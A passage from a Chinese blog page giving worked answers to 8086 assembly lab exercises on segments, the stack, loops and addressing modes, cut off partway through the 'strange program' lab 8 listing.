class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>①CPU执行程序，程序返回前，data段中的数据为多少？<br>②CPU执行程序，程序返回前，CS = _____、SS = _____、DS = _____。<br>③设程序加载后，code段的段地址为X，则data段的段地址为_____，stack段的段地址为_____。<br>答案：<br>①data段中的数据不变。<br>②212B、212A、2129（答案不唯一）<br>③X-2、X-1</p>
</li>
<li><p>将下面的程序编译连接，用Debug加载、跟踪，然后回答问题。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ds</span>:data, <span class="built_in">ss</span>:stack</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>(1)CPU执行程序，程序返回前，data段中的数据为多少？<br>(2)CPU执行程序，程序返回前，CS = _____、SS = _____、DS = _____。<br>(3)设程序加载后，code段的段地址为X，则data段的段地址为_____，stack段的段地址为_____。<br>(4)对于如下定义的段：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name <span class="meta">segment</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">segment</span> ends</span><br></pre></td></tr></table></figure>
<p>如果段中的数据占N个字节，则程序加载后，该段实际占有的空间为_____。<br>答案：<br>(1)data段中的数据不变。<br>(2)212B、212A、2129（答案不唯一）<br>(3)X-2、X-1<br>(4)((N-1)/16 + 1)*16 其中除法为整除</p>
</li>
<li><p>将下面的程序编译连接，用Debug加载、跟踪，然后回答问题。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ds</span>:data, <span class="built_in">ss</span>:stack</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>(1)CPU执行程序，程序返回前，data段中的数据为多少？<br>(2)CPU执行程序，程序返回前，CS = _____、SS = _____、DS = _____。<br>(3)设程序加载后，code段的段地址为X，则data段的段地址为_____，stack段的段地址为_____。<br>答案：<br>(1)data段中的数据不变。<br>(2)2129、212D、212C（答案不唯一）<br>(3)X+3、X+4</p>
</li>
<li><p>如果将1. 2. 3.题中的最后一条伪指令“end start”改为“end”（也就是说，不指明程序的入口），则哪个程序仍然可以正确执行？请说明原因。<br>答案：<br>只有程序3可以正确运行，在不指明程序入口的情况下，程序默认按照顺序从头开始执行，而3个程序中只有程序3的code段位于最开始的部分，所以只有程序3可以正确运行。</p>
</li>
<li><p>程序如下，编写code段中的代码，将a段和b段中的数据依此相加，将结果存到c段中。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">a <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></span><br><span class="line">a ends</span><br><span class="line"></span><br><span class="line">b <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></span><br><span class="line">b ends</span><br><span class="line"></span><br><span class="line">c <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">c ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span></span><br><span class="line">?</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, a</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, b</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, c</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">s:</span>      <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span>]</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="built_in">es</span>:[<span class="built_in">bx</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>:[<span class="built_in">bx</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>程序如下，编写code段中的代码，用push指令将a段中的前8个字型数据，逆序存储到b段中。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">a <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0ah</span>, <span class="number">0bh</span>, <span class="number">0ch</span>, <span class="number">0dh</span>, <span class="number">0eh</span>, <span class="number">0fh</span>, <span class="number">0ffh</span></span><br><span class="line">a ends</span><br><span class="line"></span><br><span class="line">b <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">b ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  </span><br><span class="line">?</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, b</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, a</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">s:</span>      <span class="keyword">push</span> [<span class="built_in">bx</span>]</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验6-实践课程中的程序"><a href="#实验6-实践课程中的程序" class="headerlink" title="实验6 实践课程中的程序"></a>实验6 实践课程中的程序</h2><ol>
<li><p>将课程中所有讲解过的程序上机调试，用Debug跟踪其执行过程，并在过程中进一步理解所讲内容。</p>
</li>
<li><p>编程，完成问题7.9中的程序。<br>程序如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg, <span class="built_in">ss</span>:stacksg, <span class="built_in">ds</span>:datasg</span><br><span class="line">stacksg <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">stacksg ends</span><br><span class="line"></span><br><span class="line">datasg <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'1. display      '</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'2. brows        '</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'3. replace      '</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'4. modify       '</span></span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, datasg</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, stacksg</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">s:</span>      <span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">s0:</span>     <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span> + <span class="built_in">si</span> + <span class="number">3</span>]</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">al</span>, <span class="number">11011111b</span></span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">bx</span> + <span class="built_in">si</span> + <span class="number">3</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">loop</span> s0</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验7-寻址方式在结构化数据访问中的应用"><a href="#实验7-寻址方式在结构化数据访问中的应用" class="headerlink" title="实验7 寻址方式在结构化数据访问中的应用"></a>实验7 寻址方式在结构化数据访问中的应用</h2><p>编程，将data段中的数据按如下格式写入到table段中，并计算21年中的人均收入（取整），结果也按照下面的格式保存在table段中。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg, <span class="built_in">ss</span>:stack</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">8</span> dup (<span class="number">0</span>)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'1975'</span>, <span class="string">'1976'</span>, <span class="string">'1977'</span>, <span class="string">'1978'</span>, <span class="string">'1979'</span>, <span class="string">'1980'</span>, <span class="string">'1981'</span>, <span class="string">'1982'</span>, <span class="string">'1983'</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'1984'</span>, <span class="string">'1985'</span>, <span class="string">'1986'</span>, <span class="string">'1987'</span>, <span class="string">'1988'</span>, <span class="string">'1989'</span>, <span class="string">'1990'</span>, <span class="string">'1991'</span>, <span class="string">'1992'</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">'1993'</span>, <span class="string">'1994'</span>, <span class="string">'1995'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dd</span> <span class="number">16</span>, <span class="number">22</span>, <span class="number">382</span>, <span class="number">1356</span>, <span class="number">2390</span>, <span class="number">8000</span>, <span class="number">16000</span>, <span class="number">24486</span>, <span class="number">50065</span>, <span class="number">97479</span>, <span class="number">140417</span>, <span class="number">197514</span></span><br><span class="line"><span class="built_in">dd</span> <span class="number">345980</span>, <span class="number">590827</span>, <span class="number">803530</span>, <span class="number">1183000</span>, <span class="number">1843000</span>, <span class="number">2759000</span>, <span class="number">3753000</span>, <span class="number">4649000</span>, <span class="number">5937000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dw</span> <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">38</span>, <span class="number">130</span>, <span class="number">220</span>, <span class="number">476</span>, <span class="number">778</span>, <span class="number">1001</span>, <span class="number">1442</span>, <span class="number">2258</span>, <span class="number">2793</span>, <span class="number">4037</span>, <span class="number">5635</span>, <span class="number">8226</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">11542</span>, <span class="number">14430</span>, <span class="number">15257</span>, <span class="number">17800</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">table <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="number">21</span> dup (<span class="string">'year summ ne ?? '</span>)</span><br><span class="line">table ends</span><br><span class="line"></span><br><span class="line">codesg <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, table</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">21</span></span><br><span class="line"><span class="symbol">year:</span>   <span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">char:</span>   <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">es</span>:[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">bx</span>+<span class="built_in">di</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">loop</span> char</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">loop</span> year</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">21</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">income:</span> <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">es</span>:[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> [<span class="number">5</span>+<span class="built_in">bx</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">si</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">es</span>:[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> [<span class="number">7</span>+<span class="built_in">bx</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">si</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">loop</span> income</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">21</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">staff:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">es</span>:[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> [<span class="number">10</span>+<span class="built_in">bx</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">si</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">loop</span> staff</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">21</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">average:</span><span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="built_in">bx</span>+<span class="number">5</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, [<span class="built_in">bx</span>+<span class="number">7</span>]</span><br><span class="line"><span class="keyword">div</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">bx</span>+<span class="number">10</span>]</span><br><span class="line"><span class="keyword">mov</span> [<span class="number">13</span>+<span class="built_in">bx</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></span><br><span class="line"><span class="keyword">loop</span> average</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p>
<h2 id="实验8-分析一个奇怪的程序"><a href="#实验8-分析一个奇怪的程序" class="headerlink" title="实验8 分析一个奇怪的程序"></a>实验8 分析一个奇怪的程序</h2><p>分析下面的程序，在运行前思考，这个程序可以正确返回吗？<br>运行后再思考：为什么是这种结果？<br>通过这个程序加深对相关内容的理解。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</span><br><span class="line">codesg <span class="meta">segment</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"><span class="symbol">start:</span> <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">s:</span>     <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, offset s</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset s2</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span>:[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cs</span>:[<span class="built_in">di</span>], <span class="built_in">ax</span></span><br><span class="line"><span class="symbol">s0:</span>    <span class="keyword">jmp</span> short s</span><br><span class="line"><span 